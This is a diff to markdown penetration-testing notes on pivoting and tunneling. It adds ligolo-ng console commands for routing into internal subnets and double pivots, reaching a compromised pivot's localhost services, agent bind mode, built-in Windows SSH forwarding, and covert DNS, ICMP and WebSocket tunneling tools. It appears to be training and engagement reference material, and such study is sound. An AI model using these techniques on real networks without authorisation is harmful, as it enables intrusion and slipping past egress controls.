@@ -1,6 +1,6 @@
 # Pivoting, Tunneling & Port Forwarding
 
-#Pivoting #Tunnel #Tunneling #PortForwarding #SOCKS #Chisel #Ligolo
+#Pivoting #Tunnel #Tunneling #PortForwarding #SOCKS #Chisel #Ligolo #proxychains #sshuttle #dnscat2 #reGeorg #DNSTunneling #ICMPTunneling #LateralMovement
 
 ## What is this?
 
@@ -12,16 +12,18 @@ Use a compromised host (pivot/beachhead) to relay traffic into internal network 
 
 | Tool | Purpose |
 |---|---|
-| `Ligolo-ng` | TUN/TAP agent tunnel — transparent routing, no proxychains needed |
-| `Chisel` | TCP/UDP tunnel over HTTP — SOCKS5 support |
-| `SSH` | Native port forwarding (`-L`, `-R`, `-D`) + dynamic SOCKS proxy |
-| `proxychains` | Route any tool through a SOCKS/HTTP proxy |
-| `Metasploit` | `route`, `socks_proxy`, `portfwd` modules |
-| `sshuttle` | VPN-over-SSH — routes entire subnet transparently |
-| `rpivot` | Reverse SOCKS proxy for restricted egress environments |
-| `socat` | Port relay and forwarding |
-| `dnscat2` | DNS-tunneled C2 + covert pivoting |
-| `reGeorg` | HTTP tunnel via uploaded webshell — SOCKS proxy over HTTP when no direct egress |
+| [[Tools/Remote Access/ligolo-ng\|Ligolo-ng]] | TUN agent tunnel — transparent routing, no proxychains needed (preferred) |
+| [[Tools/Remote Access/Chisel\|Chisel]] | TCP/UDP tunnel over HTTP — SOCKS5 support |
+| `ssh` | Native port forwarding (`-L`, `-R`, `-D`) + dynamic SOCKS proxy (standard binary) |
+| [[Tools/Remote Access/Proxychains\|proxychains]] | Route any tool through a SOCKS/HTTP proxy |
+| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `route`/autoroute, `socks_proxy`, `portfwd` modules |
+| [[Tools/Remote Access/sshuttle\|sshuttle]] | VPN-over-SSH — routes entire subnet transparently |
+| [[Tools/Remote Access/socat\|socat]] | Port relay and forwarding (incl. UDP) |
+| [[Tools/Remote Access/dnscat2\|dnscat2]] | DNS-tunneled C2 + covert pivoting |
+| [[Tools/Remote Access/reGeorg\|reGeorg]] | SOCKS proxy over HTTP via an uploaded webshell — when no direct egress |
+| [[Tools/Network/netsh\|netsh]] | Windows built-in `portproxy` port forwarding |
+| [rpivot](https://github.com/klsecservices/rpivot) | Reverse SOCKS proxy for restricted egress (legacy, Python 2) |
+| [ptunnel-ng](https://github.com/utoni/ptunnel-ng) | TCP-over-ICMP tunnel — when only ping egress is allowed |
 
 ---
 
@@ -264,14 +266,23 @@ sudo ./chisel server --reverse -v -p 1234 --socks5
 
 ## ligolo-ng
 
-Modern reverse tunneling tool. Creates a TUN interface on the attacker — routed traffic goes directly through the tunnel without proxychains. Much faster than chisel + proxychains for scanning.
+Modern reverse tunneling tool. Creates a TUN interface on the attacker — routed traffic goes directly through the tunnel without proxychains (it builds a userland network stack with gVisor). Much faster than chisel + proxychains for scanning.
 
 Two binaries: `proxy` (runs on attacker) and `agent` (runs on pivot).
 
-### Setup — one time on attacker (Kali)
+> [!important] **v0.6+ does everything from the console — no manual `ip` commands.** Older guides (and the manual method below) use `ip tuntap`/`ip route`. On ligolo-ng ≥ v0.6 create the interface and routes *inside the proxy console* instead — cleaner, no root `ip` juggling, and routes persist to the config file:
+> ```text
+> ligolo-ng » interface_create --name ligolo
+> ligolo-ng » interface_add_route --name ligolo --route 172.16.5.0/24
+> ligolo-ng » session                         # select the agent's session
+> [Agent : ...] » tunnel_start --tun ligolo    # traffic now flows
+> ```
+> Then scan directly: `nmap -sV 172.16.5.19` (no proxychains). The manual `ip` method below still works and is fine to know for older builds.
+
+### Setup — one time on attacker (Kali), *manual method / older builds*
 
 ```bash
-# Create TUN interface
+# Create TUN interface (skip this if you used interface_create in the console)
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 ```
@@ -323,6 +334,33 @@ sudo ip route add 172.16.5.0/24 dev ligolo
 ip route show
 ping 172.16.5.19       # direct ping — no proxychains needed
 nmap -sV 172.16.5.19   # direct scan
+```
+
+### Reach the pivot's OWN localhost services (240.0.0.1)
+
+A service bound to `127.0.0.1` on the pivot (a DB, an admin panel, a second C2) isn't reachable through a normal subnet route — from the attacker, `127.0.0.1` means *your* machine. ligolo maps the agent's loopback to the reserved address **`240.0.0.1`**. Route it, then hit `240.0.0.1`:
+
+```text
+ligolo-ng » interface_add_route --name ligolo --route 240.0.0.1/32
+# manual method: sudo ip route add 240.0.0.1/32 dev ligolo
+```
+
+```bash
+# Now the pivot's own 127.0.0.1:3306 is reachable at 240.0.0.1:3306
+mysql -h 240.0.0.1 -u root -p
+curl http://240.0.0.1:8080/
+```
+
+### Agent bind mode (agent listens instead of connecting back)
+
+When the pivot can't dial out to you (strict egress) but you *can* reach the pivot, flip the direction — the agent listens and the proxy connects to it:
+
+```bash
+# On the pivot — agent binds and waits
+./agent -bind -laddr 0.0.0.0:11601 -selfcert
+
+# In the proxy console — connect out to the agent
+ligolo-ng » connect_agent --ip <pivot_ip>:11601 --ignore-cert
 ```
 
 ### Double pivot with ligolo-ng (pivot → internal host → deeper subnet)
@@ -501,6 +539,8 @@ netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129
 plink -ssh -D 9050 ubuntu@10.129.15.50
 ```
 
+> [!tip] **Modern Windows has OpenSSH built in** (Windows 10 1809+ / Server 2019+) — `C:\Windows\System32\OpenSSH\ssh.exe`. So `ssh -D 9050`, `ssh -L`, and `ssh -R` often work on a Windows pivot with **no Plink needed**. Check with `where ssh` / `ssh -V`.
+
 ### SocksOverRDP (pivot through RDP sessions)
 
 Uses RDP Dynamic Virtual Channels to tunnel SOCKS through an existing RDP session.
@@ -592,28 +632,29 @@ flowchart LR
 ### With ligolo-ng (recommended)
 
 ```bash
-# 1. Attacker — setup TUN, start proxy
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
+# 1. Attacker — start proxy, then create the interface + route Pivot1's subnet (console, v0.6+)
 sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+#   ligolo-ng » interface_create --name ligolo
+#   ligolo-ng » interface_add_route --name ligolo --route 172.16.5.0/24
 
 # 2. Pivot1 — run agent back to attacker
 ./agent -connect 10.10.14.x:11601 -ignore-cert
 
-# 3. Attacker proxy console — start session, add Pivot1's internal subnet
-session → start
-sudo ip route add 172.16.5.0/24 dev ligolo
+# 3. Attacker console — select Pivot1's session and start its tunnel
+#   ligolo-ng » session          (pick Pivot1)
+#   [Agent1] » tunnel_start --tun ligolo
 
-# 4. Pivot1 proxy console — add listener so Pivot2 can connect through Pivot1
-listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
+# 4. Pivot1 console — add a listener so Pivot2 can connect back THROUGH Pivot1
+#   [Agent1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
 
-# 5. Transfer agent to Pivot2 (reachable via 172.16.5.x now)
-# Pivot2 — run agent, connect to Pivot1's listener
+# 5. Transfer agent to Pivot2 (reachable via 172.16.5.x now); Pivot2 connects to Pivot1's listener
 ./agent -connect 172.16.5.19:11601 -ignore-cert
 
-# 6. Attacker proxy console — new session appears, start it, add Pivot2's internal subnet
-session → start
-sudo ip route add 172.16.6.0/24 dev ligolo
+# 6. Attacker console — new session (Pivot2) appears; make a 2nd interface + route the deeper subnet
+#   ligolo-ng » interface_create --name ligolo2
+#   ligolo-ng » interface_add_route --name ligolo2 --route 172.16.6.0/24
+#   ligolo-ng » session          (pick Pivot2)
+#   [Agent2] » tunnel_start --tun ligolo2
 ```
 
 ### With SSH -J (simpler for SSH-only chains)
@@ -690,16 +731,31 @@ proxychains4 xfreerdp /v:172.16.6.25 /u:admin /p:pass@123
 
 ---
 
+## Other Modern Tunneling Tools
+
+Beyond the CPTS toolkit above, these come up constantly in real engagements — know they exist and what niche they fill:
+
+| Tool | Niche |
+|---|---|
+| [gost](https://github.com/go-gost/gost) | Swiss-army Go relay — chains TCP/UDP/TLS/WS/QUIC, multi-hop, load balancing; the most flexible single binary |
+| [frp](https://github.com/fatedier/frp) | Fast Reverse Proxy — production-grade reverse tunneling with a config file; extremely common on compromised infra |
+| [wstunnel](https://github.com/erebe/wstunnel) | Tunnels over **WebSocket** (looks like normal HTTPS traffic) — best for egress that only allows web protocols / passes through proxies |
+| [iodine](https://github.com/yarrick/iodine) | Full IP-over-DNS tunnel — more mature than dnscat2 when you need a routable link, not just C2 |
+
+---
+
 ## Tool Selection Guide
 
 | Scenario | Recommended tool |
 |----------|----------------|
 | Quick SOCKS proxy, Linux pivot | `ssh -D` + proxychains |
 | Fast scanning through pivot | ligolo-ng (TUN interface, no proxychains) |
+| Reach the pivot's own 127.0.0.1 services | ligolo-ng route to `240.0.0.1/32` |
 | HTTP(S) traversal only, good OPSEC | chisel (reverse) |
-| Windows pivot, no SSH | netsh, Plink, or chisel Windows binary |
+| WebSocket-only egress / strict web proxy | wstunnel |
+| Windows pivot, no SSH | netsh, Plink, or chisel Windows binary (modern Win has built-in `ssh`) |
 | Multiple network hops | ligolo-ng (listener_add) or SSH -J |
-| Firewall blocks all but DNS | dnscat2 |
+| Firewall blocks all but DNS | dnscat2 / iodine |
 | Firewall blocks all but ICMP | ptunnel-ng |
 | Transparent routing without proxychains | sshuttle |
 | Pivoting already in Metasploit session | autoroute + socks_proxy |
@@ -721,12 +777,13 @@ SSH TUNNELING
 [ ] ssh -R <pivot_port>:0.0.0.0:<local_port> <pivot> → reverse tunnel
 [ ] ssh -J <pivot> <internal> → ProxyJump direct access
 
-LIGOLO-NG (preferred for scanning)
-[ ] Create TUN interface once: ip tuntap add user $(whoami) mode tun ligolo
+LIGOLO-NG (preferred for scanning; v0.6+ console workflow)
 [ ] sudo ./proxy -selfcert -laddr 0.0.0.0:11601
-[ ] ./agent -connect <attacker>:11601 -ignore-cert
-[ ] session → start in proxy console
-[ ] sudo ip route add <subnet> dev ligolo
+[ ] ./agent -connect <attacker>:11601 -ignore-cert   (or -bind on the agent if no egress)
+[ ] interface_create --name ligolo
+[ ] interface_add_route --name ligolo --route <subnet>
+[ ] session  → pick agent → tunnel_start --tun ligolo
+[ ] Reach pivot's own localhost: interface_add_route --name ligolo --route 240.0.0.1/32
 [ ] For double pivot: listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
 
 CHISEL
@@ -748,5 +805,5 @@ WINDOWS PIVOT
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-31*
-*Model: claude-opus-4-8*
+*Updated: 2026-08-14*
+*Model: claude-opus-5*
